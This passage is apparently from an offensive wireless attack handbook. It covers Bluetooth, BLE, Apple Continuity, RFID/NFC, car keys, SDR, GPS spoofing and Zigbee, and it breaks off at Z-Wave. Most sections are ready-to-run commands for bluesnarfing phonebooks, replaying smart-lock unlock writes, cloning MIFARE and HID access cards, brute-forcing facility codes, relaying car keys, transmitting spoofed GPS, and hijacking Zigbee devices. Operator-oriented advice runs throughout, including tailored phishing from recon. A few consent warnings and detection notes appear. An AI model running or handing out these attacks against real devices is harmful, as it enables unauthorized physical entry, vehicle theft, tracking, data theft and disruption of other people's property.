```bash
# ════════════════════════════════════════════════════════════
# ESP32 MARAUDER — $10 WI-FI/BT ATTACK PLATFORM
# Author: justcallmekoko (active maintenance 2024-2025)
# Source: https://github.com/justcallmekoko/ESP32Marauder
# Hardware: ESP32 dev board ($5-10) OR ESP32-S3 ($10-15) OR
# pre-built devices (M5StickC Plus2, Cardputer, FlipperWiFi)
# ════════════════════════════════════════════════════════════

# WHY IT MATTERS:
# - $10 hardware vs $300 WiFi Pineapple Mark VII
# - Dual-band (ESP32-S3 supports 2.4 GHz + 5 GHz with Marauder fork)
# - Bluetooth Classic + BLE attack capability included
# - Standalone device — no laptop required
# - Battery-powered = portable / drop-in attack platform

# CAPABILITIES:
# - Wi-Fi: deauth flood, beacon spam, probe spam, evil twin,
#   handshake capture, PMKID capture, packet monitor
# - Bluetooth: BLE spam (Apple device proximity spoofing — used in
#   iOS "phantom AirTag" bombing), classic BT scan
# - SSID Karma attack (respond to all probe requests with matching SSID)
# - Captive portal evil twin (limited — runs on ESP32 web server)

# INSTALL (Marauder firmware):
# 1. Download .bin from github.com/justcallmekoko/ESP32Marauder/releases
# 2. Flash with esptool.py:
esptool.py --port /dev/ttyUSB0 --baud 921600 write_flash 0x0 marauder.bin
# 3. Or use Marauder Flasher (official): justcallmekoko.github.io
# 4. Connect to ESP32_Marauder Wi-Fi network → web UI on 192.168.4.1

# OPERATOR USE:
# - Drop-in attack platform: place ESP32 in target environment, control
#   over Wi-Fi web UI from across building
# - Long-duration probe/handshake collection on USB power bank
# - Apple BLE spam attack (iOS 17+ vulnerable to "phantom AirTag" pop-ups
#   from rogue BLE advertisements — annoyance/DoS class)
# - Beacon flood / SSID confusion to disrupt WIDS baseline

# DETECTION: WIDS detects beacon flood / rogue AP patterns same as
#   any tool; Apple BLE spam visible in BLE recon as flood of new
#   advertisements from random MACs.
# OPSEC RATING: HIGH for stealth deployment; LOW for active attacks
#   (same signature as Pineapple/eaphammer activity).
```

---

## PHASE 3 — BLUETOOTH ATTACKS

### 3.1 Bluetooth Classic Attacks

```bash
# === DEVICE DISCOVERY (Including Non-Discoverable) ===
# Standard scan (discoverable only):
hcitool scan

# Brute-force non-discoverable device addresses:
# BlueRanger (distance estimation):
blueranger <interface> <BT_ADDR>

# Spooftooph (clone/spoof BT identity):
spooftooph -i hci0 -a <TARGET_ADDR>    # Spoof your address

# === PAIRING ATTACKS ===
# BT PIN brute force:
# btpincrack / BTCrack (from captured pairing exchange)
# Requires sniffed pairing frames (via Ubertooth)

# Crackle (BLE Legacy pairing):
crackle -i capture.pcap               # Crack BLE legacy pairing

# === BLUEJACKING (Send unsolicited messages) ===
# Via OBEX Push:
ussp-push <BT_ADDR>@1 message.txt message.txt
# Or:
obexftp -b <BT_ADDR> -B 9 -p file.txt

# === BLUESNARFING (Unauthorized data access) ===
# If OBEX services are open/misconfigured:
obexftp -b <BT_ADDR> -B 10 -g telecom/pb.vcf    # Download phonebook
obexftp -b <BT_ADDR> -B 10 -g telecom/cal.vcs    # Download calendar
# Full filesystem browse:
obexftp -b <BT_ADDR> -l /

# === BLUETOOTH IMPERSONATION (BIAS Attack) ===
# CVE-2020-10135 - Impersonate previously paired device
# Exploits lack of mutual authentication in legacy pairing
# PoC: https://github.com/AntonioBlas/BIAS-bluetooth

# === BLUEBORNE (Remote Code Execution) ===
# CVE-2017-0781/0782/0783/0785 (Android)
# CVE-2017-1000250/1000251 (Linux)
# CVE-2017-14315 (iOS)
# Scanner:
git clone https://github.com/ArmisLabs/blueborne.git
python3 blueborne/blueborne_scanner.py <BT_ADDR>

# === BLUETOOTH PROFILE TESTING ===
# Test each exposed profile:
# HFP (Hands-Free): Audio injection/interception
# A2DP: Audio stream hijacking
# HID: Keyboard/mouse injection
# PAN: Network access via BT
# MAP: Message Access (SMS)
# PBAP: Phonebook Access

# === TRAFFIC CAPTURE WITH UBERTOOTH ===
ubertooth-btle -f -c /tmp/ble_capture.pcap
# Open in Wireshark with BLE dissector
wireshark /tmp/ble_capture.pcap
# Filter: btatt, btle, bluetooth
```

### 3.2 BLE (Bluetooth Low Energy) Attacks

```bash
# === GATT ENUMERATION ===
# gatttool (interactive):
gatttool -b <BLE_ADDR> -I
  connect
  primary                              # List primary services
  characteristics                      # List characteristics
  char-desc                            # List descriptors
  char-read-hnd <handle>              # Read by handle
  char-read-uuid <uuid>               # Read by UUID
  char-write-req <handle> <hex_value>  # Write (with response)
  char-write-cmd <handle> <hex_value>  # Write (no response)

# Read specific handle:
gatttool -b <BLE_ADDR> --char-read -a 0x000e
# Write to handle:
gatttool -b <BLE_ADDR> --char-write-req -a 0x000e -n 0100

# Enable notifications on a CCCD:
gatttool -b <BLE_ADDR> -I
  connect
  char-write-req 0x0013 0100          # Enable notifications

# === BLE MITM (GATTacker) ⚠ STALLED — HISTORICAL ONLY ===
# Project last commit ~2018; presented for reference; not recommended
# for new operations. If you must use:
# npm install gattacker (requires legacy Node + bluez stack)
# node scan.js / advertise.js / ws-slave.js / mitm.js

# === BLE MITM (BTLE-Juice) ⚠ STALLED — HISTORICAL ONLY ===
# Project abandoned ~2017; broken on modern Node 18+.
# btlejuice-proxy / btlejuice — DO NOT USE for new work

# === BLE MITM (MODERN 2026 ALTERNATIVES) ===
#
# 1. SNIFFLE (NCC Group / Sultan Qasim Khan) — PRIMARY for sniffing
git clone https://github.com/nccgroup/Sniffle
# Hardware: TI CC1352P2 / Sonoff CC1352P2-2 (~$30) flashed with
# Sniffle firmware. Best-in-class BLE 5 sniffer (BLE 4.x + 5.x +
# Coded PHY, BLE 5.4 supported in fw v1.10+):
sniff_receiver.py -i 0 -c 37 -e -o capture.pcap
#
# 2. NRF CONNECT (Nordic Semi — Android/iOS app)
# Mature GATT enumeration / read/write tool; not MITM but excellent
# for active testing of writable characteristics.
#
# 3. BTLEJACK (modern micro:bit-based — covered §1.3)
# Sniffing + jamming + reconnect-capture pattern still works
#
# 4. CUSTOM MITM via TWO bleak instances + bridge
# Operator-rolled: bleak as central + bleak as peripheral, bridge
# GATT operations between them. ~200 lines of Python; no abandoned
# Node dependencies. Active community implementations on GitHub.

# === BTLEJACK (BLE Sniffing with Micro:Bit) ===
# Requires: BBC Micro:Bit v1 (x1-3)
# Flash firmware:
btlejack -i                            # Install on connected Micro:Bit
# Sniff connections:
btlejack -f <BLE_ADDR>               # Follow specific device
btlejack -f any                        # Sniff any new connection
# Jam + sniff:
btlejack -f <BLE_ADDR> -j             # Jam then sniff re-connection
# Export to PCAP:
btlejack -o capture.pcap

# === BLE REPLAY ATTACKS ===
# 1. Capture GATT writes during legitimate operation
# 2. Replay the same writes to reproduce action
# Example: Smart lock - capture unlock command, replay it

# Using gatttool:
# Step 1: Monitor legitimate unlock
# Step 2: Note the handle and value written
# Step 3: Replay:
gatttool -b <LOCK_ADDR> --char-write-cmd -a <handle> -n <captured_value>

# === BLE FUZZING ===
# Write random values to all writable characteristics:
for handle in $(seq 0x0001 0x00ff); do
  gatttool -b <BLE_ADDR> --char-write-cmd -a $(printf "0x%04x" $handle) -n $(openssl rand -hex 4) 2>/dev/null
done
# Watch for crashes, unexpected behavior

# === BLE TRACKING ===
# Many BLE devices use static MAC addresses
# Track movement by monitoring advertisements:
sudo hcitool lescan --duplicates | grep <BLE_ADDR>
# With RSSI for distance estimation:
sudo hcitool rssi <BLE_ADDR>
# Some devices use MAC randomization — look for consistent advertising data
```

### 3.3 — Apple AWDL / Continuity / AirDrop Attacks — NEW

```bash
# ════════════════════════════════════════════════════════════
# APPLE WIRELESS DIRECT LINK (AWDL) + CONTINUITY ATTACK SURFACE
# Apple-proprietary protocols layered on top of 802.11 + BLE
# Project Zero / Ian Beer 2020 — full RCE chain via AWDL
# Source: https://googleprojectzero.blogspot.com/2020/12/an-ios-zero-click-radio-proximity.html
# ════════════════════════════════════════════════════════════

# WHAT IS AWDL:
# - Apple's mesh networking protocol over 802.11 social channel
#   (typically 802.11g/n channel 6 + 5 GHz channel 44/149)
# - Underpins AirDrop, Handoff, Continuity Camera, Universal Clipboard,
#   AirPlay peer-to-peer
# - Operates without standard 802.11 association — proprietary
#   action frames + wireless TXOP scheduling
# - Active whenever AirDrop is set to "Everyone" or "Contacts Only"
#   AND device screen is on

# WHAT IS APPLE CONTINUITY (BLE side):
# - Continuous BLE advertisements containing metadata about device
#   state, ID, nearby device count, AirDrop availability, etc.
# - Always on whenever Bluetooth is enabled (cannot be disabled)
# - Enables Hexway Reveal-class recon (deanonymization, phone number
#   inference from partial Apple ID hash, AirPods identification)

# === AWDL ATTACK PATH 1: PROJECT ZERO RCE CHAIN (Ian Beer 2020) ===
# CVE-2020-9844, CVE-2020-3843 — patched iOS 13.5 / 13.5.1 (May 2020)
# Mechanism: AWDL action frame parser memory corruption → kernel RCE
# History: Demonstrated by Ian Beer; full PoC released in Project Zero
#   blog post. Most current iOS versions patched.
# 2026 RESIDUAL: Old iOS (12.x and earlier — primarily older iPads,
#   "kids tablet" hand-me-downs) still vulnerable.

# === AWDL ATTACK PATH 2: AIRDROP CONTACT ENUMERATION ===
# AirDrop "Contacts Only" mode broadcasts hashes of phone numbers +
# email addresses to nearby devices. With pre-computed hash tables,
# operator can recover sender's identity from broadcast hashes.
# Hexway research (2019-2024) — operationalized as "Reveal" tool.
# Tool: github.com/hexway/apple_bleee
sudo airbase-ng -c 6 -P -e "Test" wlan0mon &  # AWDL channel 6
python3 ble_read_state.py                       # Decode AppleBLE
# Output: nearby Apple device count, partial phone hashes, AirPods etc.

# === CONTINUITY METADATA RECON (operator passive) ===
# Captures Continuity protocol fields (proximity pairing, handoff,
# nearby info, hotspot, magic switch):
git clone https://github.com/hexway/apple_bleee
sudo python3 airdrop_leak.py
# Outputs: nearby Apple devices + state metadata. No 0day required;
# this is Apple-by-design exposure.

# === AIRDROP DOS / SPAM (BLE flooding) ===
# Apple iOS 17+ AirDrop accepts BLE proximity advertisements that
# trigger "AirDrop file from <name>" or pairing dialogs. Operator can
# spam these to disrupt legitimate AirDrop / cause user confusion.
# Tool: ESP32 Marauder (cross-ref §2.15) "Apple BLE Spam" mode
# Or Flipper Zero with BLE spam apps (xtreme-firmware extras)
# 2026 STATE: iOS 17.2+ added rate-limiting on AirDrop dialogs —
# spam attacks reduced effectiveness against latest devices

# === DETECTION (defender-side) ===
# - macOS Spectator (LimitMonitor) catches AWDL frame anomalies on
#   managed devices
# - Apple's own JAMF Protect / Microsoft Defender for macOS now
#   include some AWDL anomaly detection (Q4 2024+)
# - Network: AWDL traffic looks like 802.11 action frames on social
#   channel — atypical pattern for non-Apple WIDS sensors

# OPERATOR REALITY 2026:
# - AWDL RCE chain (Ian Beer 2020) largely patched; residual on EOL
#   Apple devices
# - Continuity metadata recon STILL WORKS — Apple-by-design exposure
# - AirDrop spam mostly degraded post-iOS 17.2
# - Best operator path: Continuity recon for target reconnaissance +
#   social engineering (knowing target's nearby devices, AirDrop
#   state enables tailored phishing)
```

### 3.4 — Bluetooth 5.4+ / LE Audio / Auracast Attacks — NEW

```bash
# ════════════════════════════════════════════════════════════
# BLUETOOTH 5.4 (Q1 2023) + 6.0 (Q3 2024) — NEW ATTACK SURFACE
# Major addition: LE Audio + Auracast Broadcast Audio
# ════════════════════════════════════════════════════════════

# AURACAST BROADCAST AUDIO (LE Audio extension):
# - Public broadcast of audio over BLE Isochronous Channels (BIS)
# - Use cases: airport gate announcements, gym TVs, theater audio
# - Receivers join broadcast without pairing (open) or with shared key
# - Default deployments often open / unauthenticated

# === RECEIVE AURACAST BROADCAST (passive) ===
# Hardware: BLE 5.2+ adapter (most modern adapters; check with):
hciconfig hci0 features  # Look for LE Periodic Adv + LE Iso Stream support
# Tool: PyBlueZ + bleak with isochronous channel support (experimental)
# Or use commercial Auracast receiver app (Samsung Galaxy buds, ASUS, etc.)

# === AURACAST INJECTION (active) ===
# Operator broadcasts malicious audio on Auracast channel:
# - Disinformation in public spaces (airport gate change spoofing)
# - Spam audio in commercial venues
# Hardware: ESP32-C6 / nRF54L15 with LE Audio support firmware
# Tool: AuracastJamming (research-grade, limited public availability)

# === LE AUDIO PRIVACY ===
# LE Audio uses Connection-Oriented Channels (CIS) for paired audio
# (replaces Bluetooth Classic A2DP). Privacy implications:
# - LE Audio devices broadcast capability/codec metadata in advertisements
# - Identification of specific hearing aid models, earbuds, etc.
# - Potential targeting (medical device fingerprinting)

# === BLUETOOTH 6.0 SECURITY ENHANCEMENTS ===
# - LE Channel Sounding (precise distance measurement) replaces
#   RSSI-based estimation — defeats some BLE relay attack variants
#   when both devices implement Channel Sounding (mostly newer phones
#   2024+)
# - Improved key management (per-device unique key derivation)
# - Operator-relevant: BLE relay attacks against Tesla / car key BLE
#   (cross-ref §4.4) HARDER on devices supporting BT 6.0 Channel Sounding

# === BLE SPAM (already covered in §3.3 AirDrop spam context) ===
# Modern Galaxy / Pixel devices also vulnerable to BLE proximity
# spam analogous to Apple AirDrop spam — Samsung Quick Share / Google
# Find My Device proximity dialogs can be flooded.
```

---

## PHASE 4 — RFID & NFC ATTACKS

### 4.1 Proxmark3 (Dedicated RFID/NFC Tool)

```bash
# === CONNECT TO PROXMARK3 ===
./pm3                                  # Auto-detect
./pm3 /dev/ttyACM0                    # Specific port

# === AUTO-DETECT CARD TYPE ===
# Low Frequency (125kHz):
lf search                             # Auto-detect LF cards
# High Frequency (13.56MHz):
hf search                             # Auto-detect HF cards

# === LOW FREQUENCY (125kHz) RFID ===
# EM4100 (common access cards):
lf em 410x reader                     # Read EM4100 card
lf em 410x clone --id <card_id>       # Clone to T5577
lf em 410x sim --id <card_id>         # Simulate card

# HID Prox (corporate access):
lf hid reader                         # Read HID card
lf hid clone -r <raw_hex>            # Clone to T5577
lf hid sim -r <raw_hex>              # Simulate
lf hid brute -w H10301 --fc 42       # Brute force facility code

# T5577 (Writable card - chameleon):
lf t55xx detect                       # Detect T5577
lf t55xx dump                         # Dump all blocks
lf t55xx write -b <block> -d <data>  # Write block
lf t55xx wipe                         # Wipe to defaults

# AWID:
lf awid reader                        # Read AWID card
lf awid clone --fc <fc> --cn <cn>    # Clone

# Indala:
lf indala reader                      # Read Indala
lf indala clone -r <raw_hex>         # Clone

# === HIGH FREQUENCY (13.56MHz) NFC ===
# MIFARE Classic (most common):
hf mf autopwn                         # Automated attack (finds keys + dumps)
hf mf rdbl --blk 0 -k FFFFFFFFFFFF  # Read block with default key
hf mf rdsc --sec 0 -k FFFFFFFFFFFF  # Read sector
hf mf dump                            # Dump entire card (after keys found)
hf mf restore                         # Write dump to blank card (clone)

# MIFARE Classic key attacks:
hf mf darkside                        # Darkside attack (1 unknown key)
hf mf nested --blk 0 -a -k FFFFFFFFFFFF --tblk 4  # Nested attack
hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4  # Hardnested
hf mf chk --blk 0 -k /path/to/keyfile  # Check known keys
hf mf fchk                            # Fast key check (dictionary)

# MIFARE DESFire:
hf mfdes info                         # Card info
hf mfdes auth -n 0 -t 3DES -k 0000000000000000  # Authenticate

# MIFARE Ultralight:
hf mfu info                           # Card info
hf mfu dump                           # Dump card
hf mfu rdbl -b 0                     # Read block

# NFC Type 2/4 Tags (NDEF):
hf 14a reader                         # Read UID and basic info
hf 14a sim -t 1 -u <UID>            # Simulate UID

# iCLASS (HID Corporate):
hf iclass reader                      # Read card
hf iclass dump -k <key>              # Dump with key
hf iclass sim                         # Simulate

# === BRUTE FORCE & FUZZING ===
# Brute force HID facility codes:
lf hid brute -w H10301 --fc 1 --cn 1   # Start from FC:1, CN:1
# Test default keys on MIFARE:
hf mf chk *1 ? t                      # Check default keys all sectors

# === SNIFFING ===
hf sniff                               # Sniff HF communications
lf sniff                               # Sniff LF communications
# Analyze in Wireshark or decode on Proxmark
```

### 4.2 Flipper Zero RFID/NFC

```bash
# Flipper Zero has built-in 125kHz and 13.56MHz antennas

# === LOW FREQUENCY ===
# Read: RFID → Read → hold card to back of Flipper
# Emulate: RFID → Saved → select card → Emulate
# Write: RFID → Saved → select card → Write (to T5577)

# === NFC (13.56MHz) ===
# Read: NFC → Read → hold card to back of Flipper
# Detect reader: NFC → Detect Reader (for access control recon)
# Emulate: NFC → Saved → select card → Emulate
# Extract keys: NFC → Read → Flipper auto-attacks MIFARE Classic

# === CLI (via USB serial or qFlipper) ===
# Access via: screen /dev/ttyACM0 115200
# Or use qFlipper desktop app
```

### 4.3 NFC-Specific Attacks

```bash
# === NFC RELAY ATTACK ===
# Two devices: one near reader, one near card
# Relay NFC communications in real-time
# NFCGate (Android app):
# Device 1 (Reader side): NFCGate → Relay Mode → Server
# Device 2 (Card side): NFCGate → Relay Mode → Client
# Effectively clones card from distance in real-time
# Works for contactless payments, access cards, etc.

# === NFC NDEF MANIPULATION ===
# Read NDEF tag:
nfc-read-tag                          # libnfc tool
# Write malicious NDEF:
# - URL redirect to phishing site
# - Trigger app deep links
# - Wi-Fi auto-connect payload
# - Bluetooth pairing request

# Using Proxmark3:
hf mfu info                           # Check if writable
# Write NDEF URL record to Ultralight:
# Encode NDEF → write blocks

# === CLONING ACCESS CARDS ===
# Step 1: Read original card
hf mf autopwn                         # Get keys and dump
# Step 2: Write to blank card
hf mf restore --1k -k key_dump -f card_dump
# Or use Chinese Magic/UID changeable card:
hf mf csetuid <UID>                   # Set UID
hf mf cload -f card_dump              # Load dump

# Step 3: Test at access point
# Physical access testing
```

### 4.4 — Modern Car Key Attacks — NEW

```bash
# ════════════════════════════════════════════════════════════
# MODERN AUTOMOTIVE RF / KEY ATTACKS (2022-2026)
# WARNING: Vehicle-owner WRITTEN consent + on-property only
# Most jurisdictions criminalize unauthorized vehicle entry attempts
# ════════════════════════════════════════════════════════════

# === 4.4.1 — RollBack (CVE-2022-27254 — Tesla Model 3/Y) ===
# Disclosed: March 2022 by Khan / Bednarski (NCC Group)
# Source: https://www.nccgroup.com/research-blog/technical-advisory-tesla-ble-phone-as-a-key-passive-entry-vulnerable-to-relay-attacks/
# AND general "RollBack" rolling-code attack documented at DEF CON 30
# (Levente Csikor + others — affects Honda, Mazda, others)
#
# Mechanism (rolling-code RollBack — generic):
# 1. Capture LEGITIMATE consecutive rolling codes (e.g., owner presses
#    fob twice while operator records both)
# 2. Replay the OLDER code → vehicle resyncs counter to that older
#    code (some implementations accept any code within a window)
# 3. Replay the NEWER code → vehicle accepts (now in window again)
# 4. Operator now holds working access tokens
#
# Hardware: HackRF / RTL-SDR + transmit-capable SDR
# Tool: SDR + URH for capture; custom replay logic
hackrf_transfer -r rolling.raw -f 315000000 -s 2000000 -g 40
# Capture during owner key press; analyze in URH; identify two
# consecutive valid codes; replay in correct order

# === 4.4.2 — KIA Boys (CAN Injection 2022-2024) ===
# Pattern that swept TikTok 2022-2023; KIA / Hyundai vehicles 2011-2021
# WITHOUT immobilizer affected. Attack uses USB Type-A connector
# physically inserted into ignition where key cylinder normally goes.
# Lateral evolution: 2024 CAN-bus injection attacks against luxury
# vehicles (Land Rover, Toyota) via headlight / fender-mounted CAN
# wires reachable without door open.
# Hardware: USB-A + screwdriver (KIA Boys); CAN injection tool +
# wire-reach for modern variant
# Defense: KIA/Hyundai recall + immobilizer retrofit Q4 2023+

# === 4.4.3 — Tesla BLE Relay (Khan/Bednarski 2022) ===
# Tesla Phone-as-Key uses BLE proximity to authorize unlock + drive
# Attack: relay BLE communication between car (parked) and phone
# (anywhere in world if relay extended) → vehicle unlocks + starts
# Hardware: 2x devices with BLE radios + IP path between them
# Tool: NCC Group PoC (limited public release); commercial keyfob
# relay devices ($2k-$10k black market)
# Defense: Tesla added "PIN to Drive" 2022; ultra-wideband (UWB)
# distance measurement on newer Model S/X (2023+) + Model 3 refresh
# (2024+) — UWB Channel Sounding makes relay infeasible
# 2026 STATE: Older Tesla (2017-2022) without UWB still vulnerable;
# Model 3 Highland (2024) + Model S/X 2023+ have UWB defense

# === 4.4.4 — Flipper Zero Tesla NFC Charge Port ===
# Tesla charge port has NFC element identifying vehicle to
# Supercharger network. Flipper Zero can read + emulate this NFC
# tag. Attack scenarios:
# - Identify Tesla owner by VIN-equivalent NFC ID at Supercharger
# - Tesla 2023+ requires VIN match; pure NFC clone doesn't unlock
#   charging session (mitigated)
# - Still useful for fingerprinting / tracking specific vehicles

# === 4.4.5 — Generic Rolling Code Vehicles (still residual) ===
# Older vehicles (pre-2015) with simple Hi-Tag2 / Megamos Crypto:
# - Hi-Tag2: cracked by Verdult/Gar 2012; cipher recoverable from 2 valid
#   reads via radboud-university tool
# - Megamos Crypto (VW group): Verdult/Gar 2013 — VW group sued to delay
#   publication; cipher recoverable
# - Operator path: read any 2 valid IDs from owner's spare keys (pulled
#   from vehicle interior briefly) → recover cipher → forge new key

# === 4.4.6 — RollJam (Samy Kamkar 2015 — historical, residual) ===
# Original "jam + capture + delayed-replay" rolling-code attack
# Mostly mitigated on modern systems via expiring rolling codes +
# tighter resync windows. RollBack (above) is the modern variant
# that doesn't require active jamming.

# === DETECTION (defender / vehicle-owner) ===
# - Tesla mobile app shows BLE phone-as-key proximity events
# - Some modern vehicles log key authorization events to OBD-II
# - Owner anomaly: "phone-as-key triggered while phone was at home"
# - Defense in depth: PIN to Drive (Tesla), motion-disable on key fob
#   (BMW Display Key), UWB distance measurement (Tesla 2023+)
```

---

## PHASE 5 — SDR & RF ATTACKS

### 5.1 Sub-GHz Signal Analysis & Replay

```bash
# === CAPTURE RF SIGNALS ===
# Common frequencies: 315MHz, 433MHz, 868MHz, 915MHz

# HackRF capture:
hackrf_transfer -r capture.raw -f 433920000 -s 2000000 -g 40 -l 32

# RTL-SDR capture (receive only):
rtl_sdr -f 433920000 -s 2048000 -g 50 capture.raw

# Using GNU Radio:
# Build flowgraph: osmocom Source → File Sink
# Set frequency, sample rate, gain

# === ANALYZE SIGNALS ===
# Universal Radio Hacker:
urh
# 1. Open capture file
# 2. Interpretation tab → auto-detect modulation
# 3. Analysis tab → find patterns
# 4. Generator tab → create replay signal

# inspectrum (visual analysis):
inspectrum capture.raw
# Set sample rate → identify modulation type
# Measure symbol rate, frequency deviation

# === REPLAY ATTACKS ===
# HackRF replay:
hackrf_transfer -t capture.raw -f 433920000 -s 2000000 -x 40 -a 1

# GNU Radio replay:
# Flowgraph: File Source → osmocom Sink
# Match original frequency and sample rate

# Flipper Zero Sub-GHz:
# Read RAW → record signal
# Saved → select → Send → replay
# Supports: 300-348MHz, 387-464MHz, 779-928MHz

# === ROLLING CODE ANALYSIS ===
# Modern car remotes, garage doors use rolling codes
# Cannot simply replay — each code used once

# RollJam attack concept:
# 1. Jam the receiver while capturing the first code
# 2. Owner presses button again (second code)
# 3. Jam again, capture second code, replay FIRST code
# 4. Owner's door opens, you have unused SECOND code
# Requires: 2x SDR (one jam, one capture) or precise timing

# === OOK/ASK SIGNAL GENERATION ===
# For simple on-off keying devices:
# Using rfcat (Yard Stick One):
python3
from rflib import RfCat
d = RfCat()
d.setFreq(433920000)                  # Set frequency
d.setMdmModulation(MOD_ASK_OOK)      # OOK modulation
d.setMdmDRate(4800)                   # Data rate
d.setMaxPower()                       # Max TX power
d.RFxmit(b"\xAA\x55\xFF\x00" * 10)  # Transmit data
d.cleanup()

# === RTL_433 (Decode IoT sensors) ===
# Decode weather stations, tire pressure, doorbells, etc:
rtl_433 -f 433920000                  # Listen and decode
rtl_433 -f 433920000 -R all          # All protocols
rtl_433 -f 433920000 -F json          # JSON output
rtl_433 -f 315000000 -R all          # 315MHz devices
```

### 5.2 GPS Spoofing

```bash
# === GPS SIGNAL SIMULATION ===
# Legal only in shielded environments / with authorization

# gps-sdr-sim (generate GPS baseband):
git clone https://github.com/osqzss/gps-sdr-sim.git
cd gps-sdr-sim && make

# Generate signal for specific location:
./gps-sdr-sim -e brdc0010.25n -l 40.7128,-74.0060,10 -b 8 -o gps_signal.bin
# -e: RINEX navigation file (download from NASA CDDIS)
# -l: lat,lon,altitude
# -b: bit depth

# Transmit via HackRF:
hackrf_transfer -t gps_signal.bin -f 1575420000 -s 2600000 -a 1 -x 0
# CAUTION: Very low power — GPS signals are extremely weak
# Even -x 0 (0dB gain) may be too strong at close range

# === USE CASES ===
# - Test location-dependent app security
# - Evaluate GPS-based access controls
# - Assess fleet tracking system integrity
# - Test geofencing implementations
```

### 5.3 Cellular / GSM Analysis

```bash
# === PASSIVE GSM SCANNING ===
# Identify nearby cell towers:
kal -s GSM900 -g 40                   # Scan GSM900 band
kal -s GSM1800 -g 40                  # Scan GSM1800/DCS band
kal -s GSM850 -g 40                   # Scan GSM850 (Americas)

# grgsm (GNU Radio GSM):
# Capture and decode GSM:
grgsm_livemon -f <freq>              # Live monitor specific frequency
grgsm_decode -c <conf_file>          # Decode captures

# === IMSI CATCHING (Detection/Research) ===
# SRSran / OpenBTS for research (requires licensing!)
# NOT for unauthorized use

# Detection tools:
# SnoopSnitch (Android app)
# AIMSICD (Android IMSI Catcher Detector)
# Crocodile Hunter:
git clone https://github.com/EFForg/crocodilehunter.git
# Detects fake base stations

# === 4G/LTE SCANNING ===
# LTE-Cell-Scanner:
# Requires HackRF or BladeRF
# Scans for LTE cells, decodes MIB/SIB
# srsRAN for LTE research environment

# === SS7 / DIAMETER (Telecom Backbone) ===
# Requires telecom access — rarely in scope for standard engagements
# Used by nation-state actors for SMS interception, location tracking
# SigPloit (SS7/Diameter testing framework):
git clone https://github.com/SigPloiter/SigPloit.git
```

### 5.4 — 5G SA Security Model — NEW

```
═══════════════════════════════════════════════════════════
5G STANDALONE (SA) vs NON-STANDALONE (NSA) SECURITY MODEL
Operator-relevant for cellular intercept / IMSI catcher landscape
═══════════════════════════════════════════════════════════

5G NSA (Non-Standalone, deployed first):
- Uses 5G radio (NR) but anchors to 4G LTE EPC core
- Inherits LTE EPS-AKA' authentication — vulnerable to legacy
  IMSI catcher attacks (rogue eNodeB → forced fallback)
- Most carrier 5G deployments through 2023 were NSA

5G SA (Standalone, increasingly common 2024+):
- Uses 5G radio + 5G Core (5GC)
- Mandatory authentication via 5G AKA (improved over EPS-AKA')
- SUPI (Subscription Permanent Identifier) replaces IMSI
- SUCI (Subscription Concealed Identifier) — encrypted SUPI sent
  over the air using HOME NETWORK PUBLIC KEY → defeats classical
  IMSI catchers
- Mutual authentication (UE validates network identity via home
  network signature)

WHAT BREAKS UNDER 5G SA:
- Classical IMSI catcher (StingRay-class) cannot recover SUPI from
  passively captured SUCI without home network private key
- Force-downgrade-to-4G attacks (force UE to fall back to LTE for
  IMSI capture) — STILL WORK against NSA + dual-mode UEs
- Operator path: deploy rogue gNodeB advertising weak/no 5G
  service → UE may attach to 4G eNodeB instead → standard LTE/4G
  attack toolkit applies

WHAT STILL WORKS:
- Operator-side timing/RSRP analysis for UE physical localization
- Downgrade-to-4G attacks against UEs that auto-fall-back
- 5G-specific protocol fuzzing (research-grade)
- Fake 5G base station for service denial / RAN-side disruption
- SS7 / Diameter interconnect attacks (separate signaling layer
  unaffected by 5G AKA)

OPERATOR REALITY 2026:
- Most consumer carriers deploying 5G SA (T-Mobile US 2020+,
  Verizon 2024, AT&T 2024-2025)
- Enterprise / private 5G networks (factory floors, defense) often
  SA from day 1
- IMSI catcher landscape MATURE 5G SA = significantly degraded
- Downgrade attacks remain viable against dual-mode commercial
  smartphones for foreseeable future

TOOLS:
- srsRAN (open source 5G/4G RAN — research/lab use):
  git clone https://github.com/srsran/srsRAN_Project
- Open5GS (open source 5G core):
  https://open5gs.org
- 5GReplay (5G protocol fuzzing — research):
  https://github.com/Montimage/5greplay

DETECTION (defender / mobile user):
- SnoopSnitch (Android, Qualcomm-only) — limited 5G SA detection
- CellGuard (iOS) — newer 2024+ alternative; baseband-level signals
- Crocodile Hunter (EFF, ⚠ stalled ~2022) — focuses on 4G
- Modern carrier-side analytics flag rogue gNodeB signatures
```

---

## PHASE 6 — ZIGBEE & IOT PROTOCOL ATTACKS

### 6.1 Zigbee Attacks

```bash
# === HARDWARE: CC2531 USB Dongle or Atmel RZ Raven ===
# Flash with KillerBee firmware

# === KILLERBEE FRAMEWORK ===
# Scan for Zigbee networks:
zbstumbler -c 11                      # Scan channel 11
zbstumbler                             # Scan all channels (11-26)

# Sniff traffic:
zbdump -f capture.pcapng -c <channel>
# Live sniff with Wireshark:
zbwireshark -c <channel>

# Replay packets:
zbreplay -f capture.pcapng -c <channel>

# Inject packets:
zbfind -c <channel>                    # Find devices
# Forge and inject custom Zigbee frames

# === KEY SNIFFING ===
# Zigbee uses network keys for encryption
# Key is transmitted during device pairing/joining

# Capture network key during device join:
zbdump -f key_capture.pcap -c <channel>
# Wait for new device to join → key transmitted in cleartext or with well-known key

# Well-known keys:
# ZigBee HA: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39
# ZigBee LL (ZLL Master Key): leaked in 2015, available online
# ZigBee 3.0: Uses install codes or well-known default key

# Decrypt traffic with known key:
# In Wireshark: Edit → Preferences → Protocols → ZigBee → Security
# Add the network key → traffic decrypted

# === Z3SEC (ZigBee Touchlink Attacks) ===
# Scan for Touchlink-enabled devices:
z3sec_touchlink --kb /dev/ttyUSB0 --channels all scan

# Factory reset device (denial of service):
z3sec_touchlink --kb /dev/ttyUSB0 --channels <ch> reset --target <addr>

# Steal device to attacker's network:
z3sec_touchlink --kb /dev/ttyUSB0 --channels <ch> join \
  --target <addr> --channel_new <ch> --network_key <key>

# Key extraction from sniffed traffic:
z3sec_key_extract --kb /dev/ttyUSB0 --channel <channel>

# === ZIGBEE PROTOCOL ATTACKS ===
# Insecure rejoin: Many devices allow rejoin without re-authentication
# Network key update: Capture new key distribution
# PAN ID conflict: Create conflicting PAN to disrupt network
# Coordinator spoofing: Impersonate the coordinator
```

### 6.2 Z-Wave Attacks

```bash
# === HARDWARE: Sigma Designs Z-Wave USB Stick or HackRF ===

# Z-Wave operates on:
